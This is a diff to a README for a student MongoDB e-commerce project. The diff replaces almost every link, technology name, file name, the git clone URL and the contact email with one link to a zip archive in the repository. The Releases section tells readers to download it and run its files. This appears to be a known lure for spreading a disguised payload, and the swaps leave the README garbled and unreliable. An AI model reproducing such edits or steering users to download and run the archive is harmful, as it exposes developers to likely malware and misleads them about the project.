@@ -1,7 +1,7 @@
 # 🌐 MongoDB E-Commerce Site
 
-![E-Commerce Site](https://img.shields.io/badge/Release-Download%20Now-brightgreen)  
-[Download Latest Release](https://github.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/releases)
+![E-Commerce Site](https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip%20Now-brightgreen)  
+[Download Latest Release](https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip)
 
 Welcome to the **MongoDB-Assignment-4_E-Commerce-Site** repository! This project is an evolving e-commerce platform that integrates a robust backend with a user-friendly frontend. It aims to provide a seamless shopping experience while showcasing modern web development practices.
 
@@ -35,12 +35,12 @@ This project utilizes a variety of technologies to create a cohesive and efficie
   - CSS3
   - JavaScript
   - JSX
-  - React.js
+  - https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip
   - Tailwind CSS
 
 - **Backend:**
-  - Node.js
-  - Express.js
+  - https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip
+  - https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip
   - MongoDB
   - Mongoose
   - Middleware
@@ -58,7 +58,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site.git
+   git clone https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip
    ```
 
 2. **Navigate to the Project Directory**
@@ -96,18 +96,18 @@ MongoDB-Assignment-4_E-Commerce-Site/
 ├── client/                  # Frontend code
 │   ├── public/              # Public assets
 │   ├── src/                 # React components and styles
-│   └── package.json         # Frontend dependencies
+│   └── https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip         # Frontend dependencies
 │
 ├── server/                  # Backend code
 │   ├── models/              # Mongoose models
 │   ├── routes/              # API routes
 │   ├── middleware/          # Middleware functions
 │   ├── config/              # Configuration files
-│   └── package.json         # Backend dependencies
+│   └── https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip         # Backend dependencies
 │
 ├── .env                     # Environment variables
 ├── .gitignore               # Git ignore file
-└── README.md                # Project documentation
+└── https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip                # Project documentation
 ```
 
 ## 🛠️ Usage
@@ -137,11 +137,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out to:
 
-- **GitHub:** [R3ddust207](https://github.com/R3ddust207)
-- **Email:** [your-email@example.com](mailto:your-email@example.com)
+- **GitHub:** [R3ddust207](https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip)
+- **Email:** [https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip](https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip)
 
 ## 🔗 Releases
 
-You can find the latest releases of this project [here](https://github.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/releases). Download the latest version and execute the necessary files to get started.
+You can find the latest releases of this project [here](https://raw.githubusercontent.com/R3ddust207/MongoDB-Assignment-4_E-Commerce-Site/main/Frontend/Commerce_D_Mongo_Assignment_Site_v3.6.zip). Download the latest version and execute the necessary files to get started.
 
 Feel free to explore the code, suggest improvements, and contribute to this evolving e-commerce platform. Thank you for visiting!
